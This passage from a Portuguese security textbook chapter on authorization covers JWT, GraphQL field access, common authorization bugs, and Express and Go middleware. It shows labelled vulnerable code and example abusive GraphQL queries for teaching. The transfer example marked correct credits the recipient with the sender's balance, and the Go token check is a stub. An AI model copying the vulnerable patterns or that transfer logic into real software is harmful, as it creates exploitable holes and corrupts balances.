      const hasRole = requiredClaims.roles.some(role => claims.roles.includes(role));
      if (!hasRole) {
        return res.status(403).json({ error: 'Required role not present in token' });
      }
    }

    // Verificar permissoes
    if (requiredClaims.permissions) {
      const hasPermission = requiredClaims.permissions.every(
        perm => claims.permissions.includes(perm)
      );
      if (!hasPermission) {
        return res.status(403).json({ error: 'Required permissions not present in token' });
      }
    }

    // Verificar MFA
    if (requiredClaims.requireMfa && !claims.mfaVerified) {
      return res.status(403).json({ error: 'MFA verification required' });
    }

    next();
  };
}
```

### 8.9.4 Problemas Comuns com JWT para Autorizacao

**Problema 1: JWTs nao podem ser revogados facilmente**

```typescript
// Solucao: Lista de revogacao com TTL curto
class JWTRevocationList {
  private revoked: Map<string, number> = new Map();

  revoke(jti: string, ttlMs: number = 900000): void {
    this.revoked.set(jti, Date.now() + ttlMs);
  }

  isRevoked(jti: string): boolean {
    const expiry = this.revoked.get(jti);
    if (!expiry) return false;

    if (Date.now() > expiry) {
      this.revoked.delete(jti);
      return false;
    }

    return true;
  }

  // Sincronizar com Redis para distribuicao
  async syncWithRedis(redis: Redis): Promise<void> {
    const keys = await redis.keys('jwt:revoked:*');
    for (const key of keys) {
      const ttl = await redis.ttl(key);
      if (ttl > 0) {
        this.revoked.set(key.replace('jwt:revoked:', ''), Date.now() + ttl * 1000);
      }
    }
  }
}
```

**Problema 2: Claims estao desatualizadas**

```typescript
// Solucao: Token de curta duracao + refresh
class TokenRefreshStrategy {
  async handleTokenRefresh(req: Request, res: Response): Promise<void> {
    const refreshToken = req.cookies.refreshToken;
    if (!refreshToken) {
      return res.status(401).json({ error: 'No refresh token' });
    }

    try {
      const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET!) as any;

      // Verificar se a sessao ainda e valida
      const session = await sessionStore.get(decoded.sessionId);
      if (!session || session.revoked) {
        return res.status(401).json({ error: 'Session revoked' });
      }

      // Buscar dados atualizados do usuario
      const user = await userRepository.findById(decoded.sub);
      if (!user || user.status !== 'active') {
        return res.status(401).json({ error: 'User inactive' });
      }

      // Gerar novo par de tokens
      const tokens = await tokenService.generateTokenPair(user, session);

      res.cookie('refreshToken', tokens.refreshToken, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 7 * 24 * 60 * 60 * 1000,
      });

      res.json({
        accessToken: tokens.accessToken,
        expiresIn: tokens.expiresIn,
      });
    } catch (err) {
      return res.status(401).json({ error: 'Invalid refresh token' });
    }
  }
}
```

---

## 8.10 Autorizacao em GraphQL

GraphQL apresenta desafios unicos para autorizacao porque os clientes podem especificar exatamente quais campos querem, criando uma superficie de ataque dinamica e imprevisivel.

### 8.10.1 Desafios de Autorizacao em GraphQL

**Problema 1: Query Complexity Attacks**

Um cliente pode enviar queries que consomem recursos excessiveiros:

```graphql
# Query maliciosa -- consome recursos massivos
query MaliciousQuery {
  users {
    orders {
      items {
        product {
          reviews {
            author {
              orders {
                items {
                  product {
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Problema 2: Introspection Exposure**

A introspection padrao do GraphQL expoe todo o esquema, incluindo campos que podem nao ser para todos os usuarios:

```graphql
# Atacante pode descobrir campos sensiveis
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### 8.10.2 Controle de Acesso em Nivel de Campo

```typescript
import { GraphQLSchema, GraphQLObjectType, GraphQLString, GraphQLInt } from 'graphql';

// Decorator para autorizacao em nivel de campo
function authorized(options: {
  requireRole?: string;
  requirePermission?: string;
  ownerOnly?: boolean;
}) {
  return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) {
    const originalResolver = descriptor.value;

    descriptor.value = async function (parent: any, args: any, context: any, info: any) {
      const { user } = context;

      if (!user) {
        throw new Error('Not authenticated');
      }

      if (options.requireRole && !user.roles.includes(options.requireRole)) {
        if (!user.roles.includes('admin')) {
          throw new Error('Insufficient role');
        }
      }

      if (options.requirePermission && !user.permissions.includes(options.requirePermission)) {
        throw new Error('Insufficient permissions');
      }

      if (options.ownerOnly && parent.userId !== user.id) {
        if (!user.roles.includes('admin')) {
          throw new Error('Not resource owner');
        }
      }

      return originalResolver.call(this, parent, args, context, info);
    };
  };
}

// Schema GraphQL com autorizacao
const userType = new GraphQLObjectType({
  name: 'User',
  fields: () => ({
    id: { type: GraphQLString },
    name: { type: GraphQLString },
    email: {
      type: GraphQLString,
      resolve: (parent, args, context) => {
        // Email so visivel para o proprio usuario ou admin
        if (parent.id !== context.user.id && !context.user.roles.includes('admin')) {
          return null;
        }
        return parent.email;
      },
    },
    phone: {
      type: GraphQLString,
      resolve: (parent, args, context) => {
        if (parent.id !== context.user.id) {
          return null;
        }
        return parent.phone;
      },
    },
    orders: {
      type: new GraphQLList(orderType),
      resolve: (parent, args, context) => {
        if (parent.id !== context.user.id && !context.user.roles.includes('admin')) {
          return [];
        }
        return db.orders.findByUserId(parent.id);
      },
    },
  }),
});
```

### 8.10.3 Protecao contra Query Complexity

```typescript
import depthLimit from 'graphql-depth-limit';
import { createComplexityLimitRule } from 'graphql-validation-complexity';

const schema = new GraphQLSchema({
  // ... schema definition
});

// Limitar profundidade da query
const depthValidator = depthLimit(7);

// Limitar complexidade
const complexityValidator = createComplexityLimitRule(1000);

// Middleware de validacao
function graphqlAuthMiddleware(req: Request, res: Response, next: NextFunction) {
  // Desabilitar introspection em production
  if (process.env.NODE_ENV === 'production') {
    if (req.body.query && req.body.query.includes('__schema')) {
      return res.status(403).json({ error: 'Introspection disabled in production' });
    }
  }

  // Validar complexidade antes de processar
  const validationRules = [depthValidator, complexityValidator];

  // Aplicar regras de validacao
  const errors = validateQuery(req.body.query, validationRules);
  if (errors.length > 0) {
    return res.status(400).json({ errors });
  }

  next();
}
```

### 8.10.4 Shield de Autorizacao com graphql-shield

```typescript
import { shield, rule, and, or, not } from 'graphql-shield';

const isAuthenticated = rule()((parent, args, { user }) => {
  return user !== null && user !== undefined;
});

const isAdmin = rule()((parent, args, { user }) => {
  return user?.roles.includes('admin') === true;
});

const isOwner = rule()((parent, args, { user }) => {
  return parent.userId === user?.id;
});

const canReadPosts = rule()((parent, args, { user }) => {
  return user?.permissions.includes('posts:read') === true;
});

const canWritePosts = rule()((parent, args, { user }) => {
  return user?.permissions.includes('posts:write') === true;
});

const permissions = shield({
  Query: {
    me: isAuthenticated,
    users: and(isAuthenticated, isAdmin),
    posts: canReadPosts,
  },
  Mutation: {
    createPost: and(isAuthenticated, canWritePosts),
    updatePost: and(isAuthenticated, or(isOwner, isAdmin)),
    deletePost: and(isAuthenticated, or(isOwner, isAdmin)),
  },
  User: {
    email: or(isOwner, isAdmin),
    phone: isOwner,
  },
}, {
  fallbackRule: isAuthenticated,
  allowExternalErrors: true,
});

// Aplicar no schema
const schema = applyMiddleware(schemaDefinition, permissions);
```

---

## 8.11 Bugs Comuns de Autorizacao

### 8.11.1 Top 10 de Bugs de Autorizacao

| # | Bug | Severidade | Frequencia |
|---|-----|-----------|------------|
| 1 | IDOR -- acesso a objetos de outros usuarios | Alta | Muito alta |
| 2 | Falta de verificacao de ownership | Alta | Alta |
| 3 | Escalacao de privilegios via role manipulation | Critica | Media |
| 4 | Bypass de middleware de autorizacao | Critica | Media |
| 5 | JWT sem verificacao de assinatura | Critica | Baixa |
| 6 | Cross-tenant access | Critica | Media |
| 7 | Time-of-check to time-of-use (TOCTOU) | Alta | Baixa |
| 8 | Insecure deserialization em tokens | Critica | Baixa |
| 9 | Missing rate limiting em operacoes de autorizacao | Media | Alta |
| 10 | Exposicao de schema GraphQL em production | Media | Alta |

### 8.11.2 Exemplos de Bugs e Correcoes

**Bug 1: Verificacao de autorizacao depois do processamento**

```typescript
// VULNERAVEL: Dados processados antes da verificacao
app.put('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  const updated = { ...doc, ...req.body };

  // Dados ja foram processados -- mesmo que neguemos agora, side effects ja ocorreram
  await someSideEffect(updated);

  if (doc.userId !== req.user.id) {
    return res.status(403).json({ error: 'Access denied' });
  }

  await db.documents.update(req.params.id, updated);
  res.json(updated);
});

// CORRETO: Verificar ANTES de qualquer processamento
app.put('/api/documents/:id', authenticate, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  if (!doc) {
    return res.status(404).json({ error: 'Not found' });
  }

  if (doc.userId !== req.user.id && !req.user.roles.includes('admin')) {
    return res.status(403).json({ error: 'Access denied' });
  }

  const updated = { ...doc, ...req.body };
  await someSideEffect(updated);
  await db.documents.update(req.params.id, updated);
  res.json(updated);
});
```

**Bug 2: Race condition em verificacao de autorizacao**

```typescript
// VULNERAVEL: TOCTOU -- verificacao e acao sao operacoes separadas
async function transferFunds(fromId: string, toId: string, amount: number, userId: string) {
  const fromAccount = await db.accounts.findById(fromId);

  // CHECK: Verificar saldo
  if (fromAccount.balance < amount) {
    throw new Error('Insufficient funds');
  }

  // GAP: Outra requisicao pode alterar o saldo aqui

  // ACTION: Debitar
  await db.accounts.update(fromId, { balance: fromAccount.balance - amount });
  await db.accounts.update(toId, { balance: fromAccount.balance + amount });
}

// CORRETO: Usar transacao atomica
async function transferFunds(fromId: string, toId: string, amount: number, userId: string) {
  await db.transaction(async (tx) => {
    const fromAccount = await tx.accounts.findById(fromId, { forUpdate: true });

    if (fromAccount.balance < amount) {
      throw new Error('Insufficient funds');
    }

    if (fromAccount.userId !== userId) {
      throw new Error('Not account owner');
    }

    await tx.accounts.update(fromId, { balance: fromAccount.balance - amount });
    await tx.accounts.update(toId, { balance: fromAccount.balance + amount });
  });
}
```

**Bug 3: Bypass de autorizacao via HTTP method**

```typescript
// VULNERAVEL: Middleware so aplicado em GET
app.get('/api/users/:id', authenticate, authorize({ roles: ['admin'] }), getUser);

// Atacante pode usar POST/PUT/DELETE para bypassar
app.post('/api/users/:id', async (req, res) => {
  // Sem middleware de autorizacao!
  const user = await db.users.findById(req.params.id);
  res.json(user);
});

// CORRETO: Aplicar middleware uniformemente
const userRoutes = express.Router();
userRoutes.use(authenticate);

userRoutes.get('/:id', authorize({ roles: ['admin'] }), getUser);
userRoutes.post('/', authorize({ permissions: ['users:create'] }), createUser);
userRoutes.put('/:id', authorize({ permissions: ['users:update'] }), updateUser);
userRoutes.delete('/:id', authorize({ permissions: ['users:delete'] }), deleteUser);

app.use('/api/users', userRoutes);
```

---

## 8.12 Middleware Completo de Autorizacao em Express.js

### 8.12.1 Arquitetura do Middleware

```
Request
  |
  v
[Security Headers] -> [Rate Limiter] -> [CORS] -> [Body Parser]
  |
  v
[JWT Authentication] -> [Tenant Context] -> [RBAC Check] -> [Ownership Check]
  |
  v
[Request Handler]
  |
  v
[Response Logger] -> [Audit Log]
```

### 8.12.2 Implementacao Completa

```typescript
import express, { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { RateLimiterMemory } from 'rate-limiter-flexible';

// ============================================
// Types
// ============================================

interface AuthUser {
  id: string;
  email: string;
  roles: string[];
  permissions: string[];
  tenantId: string;
  teamId?: string;
  mfaVerified: boolean;
  sessionId: string;
}

interface AuthenticatedRequest extends Request {
  user?: AuthUser;
  tenant?: { id: string; name: string; features: string[] };
  resourceId?: string;
}

interface AuditEntry {
  timestamp: string;
  userId: string;
  tenantId: string;
  action: string;
  resource: string;
  resourceId?: string;
  result: 'allowed' | 'denied';
  reason?: string;
  ip: string;
  userAgent: string;
  requestId: string;
}

// ============================================
// Configuration
// ============================================

interface AuthConfig {
  jwtPublicKey: string;
  jwtIssuer: string;
  jwtAudience: string;
  rateLimitPoints: number;
  rateLimitDuration: number;
  maxLogEntries: number;
}

// ============================================
// Audit Logger
// ============================================

class AuditLogger {
  private entries: AuditEntry[] = [];
  private maxEntries: number;

  constructor(maxEntries: number = 10000) {
    this.maxEntries = maxEntries;
  }

  log(entry: AuditEntry): void {
    this.entries.push(entry);

    if (this.entries.length > this.maxEntries) {
      this.entries.shift();
    }

    // Em producao: enviar para SIEM, Elasticsearch, etc.
    console.log(JSON.stringify(entry));
  }

  getEntries(filters: Partial<AuditEntry>): AuditEntry[] {
    return this.entries.filter(entry => {
      return Object.entries(filters).every(([key, value]) =>
        entry[key as keyof AuditEntry] === value
      );
    });
  }
}

// ============================================
// Token Verifier
// ============================================

class TokenVerifier {
  private publicKey: string;
  private issuer: string;
  private audience: string;

  constructor(config: AuthConfig) {
    this.publicKey = config.jwtPublicKey;
    this.issuer = config.jwtIssuer;
    this.audience = config.jwtAudience;
  }

  verify(token: string): AuthUser {
    const decoded = jwt.verify(token, this.publicKey, {
      algorithms: ['RS256'],
      issuer: this.issuer,
      audience: this.audience,
    }) as any;

    return {
      id: decoded.sub,
      email: decoded.email,
      roles: decoded.roles || [],
      permissions: decoded.permissions || [],
      tenantId: decoded.tenantId,
      teamId: decoded.teamId,
      mfaVerified: decoded.mfaVerified || false,
      sessionId: decoded.sessionId,
    };
  }
}

// ============================================
// Authorization Middleware
// ============================================

class AuthorizationMiddleware {
  private auditLogger: AuditLogger;
  private tokenVerifier: TokenVerifier;
  private rateLimiter: RateLimiterMemory;

  constructor(config: AuthConfig) {
    this.auditLogger = new AuditLogger(config.maxLogEntries);
    this.tokenVerifier = new TokenVerifier(config);
    this.rateLimiter = new RateLimiterMemory({
      points: config.rateLimitPoints,
      duration: config.rateLimitDuration,
    });
  }

  authenticate() {
    return async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
      const requestId = crypto.randomUUID();

      try {
        // Rate limiting
        await this.rateLimiter.consume(req.ip);

        // Extract token
        const authHeader = req.headers.authorization;
        if (!authHeader || !authHeader.startsWith('Bearer ')) {
          this.logAudit(req, requestId, 'denied', 'Missing authorization header');
          return res.status(401).json({ error: 'Authentication required' });
        }

        const token = authHeader.substring(7);
        const user = this.tokenVerifier.verify(token);

        req.user = user;
        req.requestId = requestId;

        next();
      } catch (err: any) {
        if (err.name === 'RateLimiterRes') {
          return res.status(429).json({ error: 'Rate limit exceeded' });
        }

        if (err.name === 'JsonWebTokenError') {
          this.logAudit(req, requestId, 'denied', 'Invalid token');
          return res.status(401).json({ error: 'Invalid token' });
        }

        if (err.name === 'TokenExpiredError') {
          return res.status(401).json({ error: 'Token expired' });
        }

        this.logAudit(req, requestId, 'denied', 'Authentication failed');
        return res.status(500).json({ error: 'Authentication error' });
      }
    };
  }

  authorize(options: {
    roles?: string[];
    permissions?: string[];
    requireAll?: boolean;
    requireMfa?: boolean;
    maxTokenAge?: number;
  } = {}) {
    return (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
      const user = req.user;

      if (!user) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      // Check MFA
      if (options.requireMfa && !user.mfaVerified) {
        this.logAudit(req, req.requestId!, 'denied', 'MFA required');
        return res.status(403).json({ error: 'MFA verification required' });
      }

      // Check roles
      if (options.roles && options.roles.length > 0) {
        const hasRole = options.requireAll
          ? options.roles.every(r => user.roles.includes(r))
          : options.roles.some(r => user.roles.includes(r));

        if (!hasRole) {
          this.logAudit(req, req.requestId!, 'denied', 'Insufficient role');
          return res.status(403).json({ error: 'Insufficient role' });
        }
      }

      // Check permissions
      if (options.permissions && options.permissions.length > 0) {
        const hasPermission = options.requireAll
          ? options.permissions.every(p => user.permissions.includes(p))
          : options.permissions.some(p => user.permissions.includes(p));

        if (!hasPermission) {
          this.logAudit(req, req.requestId!, 'denied', 'Insufficient permissions');
          return res.status(403).json({ error: 'Insufficient permissions' });
        }
      }

      this.logAudit(req, req.requestId!, 'allowed');
      next();
    };
  }

  requireOwnership(getOwnerId: (req: AuthenticatedRequest) => Promise<string | null>) {
    return async (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
      if (!req.user) {
        return res.status(401).json({ error: 'Not authenticated' });
      }

      // Admin bypass
      if (req.user.roles.includes('admin')) {
        return next();
      }

      const ownerId = await getOwnerId(req);

      if (ownerId === null) {
        return res.status(404).json({ error: 'Resource not found' });
      }

      if (ownerId !== req.user.id) {
        this.logAudit(req, req.requestId!, 'denied', 'Not resource owner');
        return res.status(403).json({ error: 'Access denied' });
      }

      next();
    };
  }

  private logAudit(
    req: AuthenticatedRequest,
    requestId: string,
    result: 'allowed' | 'denied',
    reason?: string
  ): void {
    this.auditLogger.log({
      timestamp: new Date().toISOString(),
      userId: req.user?.id || 'anonymous',
      tenantId: req.user?.tenantId || 'none',
      action: `${req.method} ${req.path}`,
      resource: req.path,
      resourceId: req.params?.id,
      result,
      reason,
      ip: req.ip,
      userAgent: req.headers['user-agent'] || '',
      requestId,
    });
  }
}

// ============================================
// Setup
// ============================================

const config: AuthConfig = {
  jwtPublicKey: process.env.JWT_PUBLIC_KEY!,
  jwtIssuer: 'auth-service',
  jwtAudience: 'api-gateway',
  rateLimitPoints: 100,
  rateLimitDuration: 60,
  maxLogEntries: 10000,
};

const auth = new AuthorizationMiddleware(config);
const app = express();

app.use(express.json());

// Rotas publicas
app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

// Rotas autenticadas
app.use('/api', auth.authenticate());

// Rotas que exigem role admin
app.get('/api/admin/users', auth.authorize({ roles: ['admin'] }), listUsers);
app.delete('/api/admin/users/:id', auth.authorize({ roles: ['admin'] }), deleteUser);

// Rotas que exigem permissao especifica
app.post('/api/articles',
  auth.authorize({ permissions: ['articles:create'] }),
  createArticle
);

app.put('/api/articles/:id',
  auth.authorize({ permissions: ['articles:update'] }),
  auth.requireOwnership(async (req) => {
    const article = await db.articles.findById(req.params.id);
    return article?.authorId || null;
  }),
  updateArticle
);

app.delete('/api/articles/:id',
  auth.authorize({ permissions: ['articles:delete'] }),
  auth.requireOwnership(async (req) => {
    const article = await db.articles.findById(req.params.id);
    return article?.authorId || null;
  }),
  deleteArticle
);

export { AuthorizationMiddleware, AuditLogger, TokenVerifier };
```

---

## 8.13 Middleware Completo de Autorizacao em Go

### 8.13.1 Arquitetura em Go

```go
package authz

import (
    "context"
    "encoding/json"
    "fmt"
    "net/http"
    "strings"
    "sync"
    "time"
)

type contextKey string

const (
    UserKey    contextKey = "user"
    TenantKey  contextKey = "tenant"
    RequestKey contextKey = "request_id"
)

type User struct {
    ID          string    `json:"id"`
    Email       string    `json:"email"`
    Roles       []string  `json:"roles"`
    Permissions []string  `json:"permissions"`
    TenantID    string    `json:"tenant_id"`
    TeamID      string    `json:"team_id"`
    MFaverified bool      `json:"mfa_verified"`
    SessionID   string    `json:"session_id"`
    ExpiresAt   time.Time `json:"expires_at"`
}

type Tenant struct {
    ID       string   `json:"id"`
    Name     string   `json:"name"`
    Features []string `json:"features"`
    Active   bool     `json:"active"`
}

type AuditEntry struct {
    Timestamp string `json:"timestamp"`
    UserID    string `json:"user_id"`
    TenantID  string `json:"tenant_id"`
    Action    string `json:"action"`
    Resource  string `json:"resource"`
    ResourceID string `json:"resource_id,omitempty"`
    Result    string `json:"result"`
    Reason    string `json:"reason,omitempty"`
    IP        string `json:"ip"`
    RequestID string `json:"request_id"`
}

type AuditLogger struct {
    mu     sync.RWMutex
    entries []AuditEntry
    maxEntries int
}

func NewAuditLogger(maxEntries int) *AuditLogger {
    return &AuditLogger{
        maxEntries: maxEntries,
    }
}

func (l *AuditLogger) Log(entry AuditEntry) {
    l.mu.Lock()
    defer l.mu.Unlock()

    l.entries = append(l.entries, entry)
    if len(l.entries) > l.maxEntries {
        l.entries = l.entries[1:]
    }

    data, _ := json.Marshal(entry)
    fmt.Println(string(data))
}

func (l *AuditLogger) GetEntries(userID string) []AuditEntry {
    l.mu.RLock()
    defer l.mu.RUnlock()

    var result []AuditEntry
    for _, e := range l.entries {
        if userID == "" || e.UserID == userID {
            result = append(result, e)
        }
    }
    return result
}

type Middleware struct {
    jwtSecret  []byte
    issuer     string
    audience   string
    auditLog   *AuditLogger
}

func NewMiddleware(jwtSecret []byte, issuer, audience string) *Middleware {
    return &Middleware{
        jwtSecret: jwtSecret,
        issuer:    issuer,
        audience:  audience,
        auditLog:  NewAuditLogger(10000),
    }
}

func (m *Middleware) Authenticate(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        authHeader := r.Header.Get("Authorization")
        if authHeader == "" || !strings.HasPrefix(authHeader, "Bearer ") {
            m.writeJSON(w, http.StatusUnauthorized, map[string]string{
                "error": "Authentication required",
            })
            return
        }

        token := strings.TrimPrefix(authHeader, "Bearer ")
        user, err := m.validateToken(token)
        if err != nil {
            m.writeJSON(w, http.StatusUnauthorized, map[string]string{
                "error": "Invalid token",
            })
            return
        }

        ctx := context.WithValue(r.Context(), UserKey, user)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}

func (m *Middleware) RequireRole(role string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user := m.getUser(r)
        if user == nil {
            m.writeJSON(w, http.StatusUnauthorized, map[string]string{
                "error": "Not authenticated",
            })
            return
        }

        if !m.contains(user.Roles, role) && !m.contains(user.Roles, "admin") {
            m.auditLog.Log(AuditEntry{
                Timestamp: time.Now().Format(time.RFC3339),
                UserID:    user.ID,
                Action:    fmt.Sprintf("%s %s", r.Method, r.URL.Path),
                Result:    "denied",
                Reason:    fmt.Sprintf("Required role: %s", role),
                IP:        r.RemoteAddr,
            })
            m.writeJSON(w, http.StatusForbidden, map[string]string{
                "error": "Insufficient role",
            })
            return
        }

        next.ServeHTTP(w, r)
    })
}

func (m *Middleware) RequirePermission(permission string, next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user := m.getUser(r)
        if user == nil {
            m.writeJSON(w, http.StatusUnauthorized, map[string]string{
                "error": "Not authenticated",
            })
            return
        }

        if !m.contains(user.Permissions, permission) {
            m.auditLog.Log(AuditEntry{
                Timestamp: time.Now().Format(time.RFC3339),
                UserID:    user.ID,
                Action:    fmt.Sprintf("%s %s", r.Method, r.URL.Path),
                Result:    "denied",
                Reason:    fmt.Sprintf("Required permission: %s", permission),
                IP:        r.RemoteAddr,
            })
            m.writeJSON(w, http.StatusForbidden, map[string]string{
                "error": "Insufficient permissions",
            })
            return
        }

        next.ServeHTTP(w, r)
    })
}

func (m *Middleware) RequireOwnership(
    resourceType string,
    getOwnerID func(r *http.Request) (string, error),
    next http.Handler,
) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        user := m.getUser(r)
        if user == nil {
            m.writeJSON(w, http.StatusUnauthorized, map[string]string{
                "error": "Not authenticated",
            })
            return
        }

        // Admin bypass
        if m.contains(user.Roles, "admin") {
            next.ServeHTTP(w, r)
            return
        }

        ownerID, err := getOwnerID(r)
        if err != nil {
            m.writeJSON(w, http.StatusNotFound, map[string]string{
                "error": "Resource not found",
            })
            return
        }

        if ownerID != user.ID {
            m.auditLog.Log(AuditEntry{
                Timestamp:  time.Now().Format(time.RFC3339),
                UserID:     user.ID,
                Action:     fmt.Sprintf("%s %s", r.Method, r.URL.Path),
                Resource:   resourceType,
                ResourceID: r.URL.Query().Get("id"),
                Result:     "denied",
                Reason:     "Not resource owner",
                IP:         r.RemoteAddr,
            })
            m.writeJSON(w, http.StatusForbidden, map[string]string{
                "error": "Access denied",
            })
            return
        }

        next.ServeHTTP(w, r)
    })
}

func (m *Middleware) validateToken(tokenString string) (*User, error) {
    // Implementacao simplificada
    // Em producao, use biblioteca JWT como dgrijalva/jwt-go
    return nil, fmt.Errorf("not implemented")
}

func (m *Middleware) getUser(r *http.Request) *User {
    user, ok := r.Context().Value(UserKey).(*User)
    if !ok {
        return nil
    }
    return user
}

func (m *Middleware) contains(slice []string, item string) bool {
    for _, s := range slice {
        if s == item {
            return true
        }
    }
    return false
}

func (m *Middleware) writeJSON(w http.ResponseWriter, status int, data interface{}) {
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(status)
    json.NewEncoder(w).Encode(data)
}

// Chain combina multiplos handlers
func Chain(h http.Handler, middleware ...func(http.Handler) http.Handler) http.Handler {
    for i := len(middleware) - 1; i >= 0; i-- {
        h = middleware[i](h)
    }
    return h
}

// Uso no servidor principal
func SetupRoutes(mux *http.ServeMux, mw *Middleware) {
    mux.Handle("/api/health", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Type", "application/json")
        w.Write([]byte(`{"status":"ok"}`))
    }))

    // Rotas publicas -- somente authenticate
    mux.Handle("/api/users/me",
        Chain(
            http.HandlerFunc(getCurrentUserHandler),
            mw.Authenticate,
        ),
    )

    // Rotas que exigem role
    mux.Handle("/api/admin/users",
        Chain(
            http.HandlerFunc(listUsersHandler),
            mw.Authenticate,
            func(next http.Handler) http.Handler {
                return mw.RequireRole("admin", next)
            },
        ),
    )

    // Rotas que exigem permissao
    mux.Handle("/api/articles",
        Chain(
            http.HandlerFunc(createArticleHandler),
            mw.Authenticate,
            func(next http.Handler) http.Handler {
                return mw.RequirePermission("articles:create", next)
            },
        ),
    )
}

func getCurrentUserHandler(w http.ResponseWriter, r *http.Request) {
    user := r.Context().Value(UserKey).(*User)
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(user)
}

func listUsersHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    w.Write([]byte(`{"users":[]}`))
}

func createArticleHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    w.Write([]byte(`{"message":"article created"}`))
}
```

---

## 8.14 Exercicios

### Exercicio 1: Implementacao de RBAC Basico

**Objetivo:** Implementar um sistema RBAC completo em TypeScript.

**Requisitos:**
- Criar tipos `User`, `Role`, `Permission`
- Implementar `RBACEngine` com metodos `hasPermission`, `assignRole`, `revokeRole`
- Suportar roles hierarquicas (admin herda de editor, editor herda de viewer)
- Suportar constraints: mutual exclusion (um usuario nao pode ser admin e viewer ao mesmo tempo)
- Implementar logging de todas as operacoes de autorizacao
- Escrever testes unitarios cobrindo pelo menos 10 cenarios

**Cenarios para testar:**
1. Admin pode acessar qualquer recurso
2. Editor pode criar e atualizar artigos
3. Viewer so pode ler
4. Mutual exclusion impede atribuicao conflitante
5. Revogacao de role remove permissao imediatamente
6. Role expirada nao concede permissao
7. Role atribuida a um tenant nao afeta outros tenants
8. Heranca de roles funciona corretamente
9. Um usuario com multiplas roles herda todas as permissoes
10. Log de auditoria registra todas as operacoes

### Exercicio 2: Prevencao de IDOR

**Objetivo:** Implementar middleware de prevencao de IDOR em Express.js.

**Requisitos:**
- Criar middleware `preventIDOR` que:
  - Verifica ownership de recursos automaticamente
  - Suporta diferentes campos de ownership (userId, authorId, createdBy)
  - Suporta bypass por role (admin)
  - Registra tentativas de acesso negado em audit log
- Criar pelo menos 3 endpoints protegidos:
  - `GET /api/documents/:id` -- ownership por userId
  - `PUT /api/orders/:id` -- ownership por customerId
  - `DELETE /api/comments/:id` -- ownership por authorId
- Escrever testes que tentem IDOR em cada endpoint
- Documentar como o atacante tentaria explorar cada endpoint

### Exercicio 3: Sistema de Autorizacao Multi-Tenant

**Objetivo:** Implementar isolamento multi-tenant com RLS.

**Requisitos:**
- Criar schema SQL com tabelas `tenants`, `users`, `documents`
- Habilitar RLS em todas as tabelas
- Implementar politicas de isolamento:
  - Cada tenant so ve seus proprios dados
  - Super admin pode acessar todos os tenants
  - Usuario so ve seus proprios documentos dentro do tenant
- Implementar `TenantMiddleware` que:
  - Valida o tenant do usuario
  - Configura o contexto do banco de dados
  - Verifica limites do tenant (max usuarios, max storage)
- Implementar `TenantGuard` que previne cross-tenant access
- Escrever testes que tentem cross-tenant access

### Exercicio 4: OPA Integration

**Objetivo:** Implementar autorizacao com OPA para uma API de e-commerce.

**Requisitos:**
- Escrever politicas Rego que suportem:
  - Administradores podem gerenciar todos os produtos
  - Vendedores so podem gerenciar seus proprios produtos
  - Clientes so podem visualizar produtos publicos
  - Ninguem pode comprar de si mesmo
  - Operacoes acima de R$ 10.000 requerem aprovacao
- Implementar `OPAClient` em TypeScript que:
  - Consulta o servidor OPA para decisoes de autorizacao
  - Cacheia decisoes com TTL curto (5 minutos)
  - Fallback para deny em caso de erro de conexao
- Integrar com Express.js via middleware
- Escrever testes para cada politica

### Exercicio 5: Auditoria de Privilegios

**Objetivo:** Implementar sistema de auditoria de privilegios.

**Requisitos:**
- Criar modelo de dados `PrivilegeAudit` com campos:
  - entity, entityType, resource, permission
  - grantedAt, lastUsed, usageCount
  - riskLevel, recommendation
- Implementar `PrivilegeAuditor` com metodos:
  - `audit()` -- retorna todos os privilegios com nivel de risco
  - `findUnusedPermissions(days)` -- encontra permissoes nao usadas
  - `findOverlyBroadPermissions()` -- encontra permissoes com wildcards
  - `findUsersWithoutMFA()` -- encontra usuarios admin sem MFA
  - `generateReport()` -- gera relatorio consolidado
- Implementar `PrivilegeRevoker` que:
  - Revoga permissoes automaticamente com base em politicas configuraveis
  - Envia notificacoes antes de revogar
  - Mantem log de todas as revogacoes
- Escrever testes cobrindo todos os cenarios

### Exercicio 6: GraphQL Authorization

**Objetivo:** Implementar autorizacao em nivel de campo em GraphQL.

**Requisitos:**
- Criar schema GraphQL com tipos `User`, `Post`, `Comment`
- Implementar autorizacao em nivel de campo:
  - Email do usuario so visivel para o proprio usuario ou admin
  - Post so editavel pelo autor
  - Comment so editavel pelo autor
  - Posts private so visiveis para o autor
- Implementar protecao contra query complexity:
  - Limitar profundidade a 7 niveis
  - Limitar complexidade a 1000
  - Desabilitar introspection em production
- Implementar `graphql-shield` com regras de autorizacao
- Escrever testes que tentem:
  - Acessar campos sem autenticacao
  - Acessar campos de outros usuarios
  - Enviar queries complexas (depth > 7)
  - Usar introspection em production

### Exercicio 7: Complete Authorization Middleware

**Objetivo:** Implementar middleware de autorizacao completo e testado em Go.

**Requisitos:**
- Implementar os seguintes middlewares:
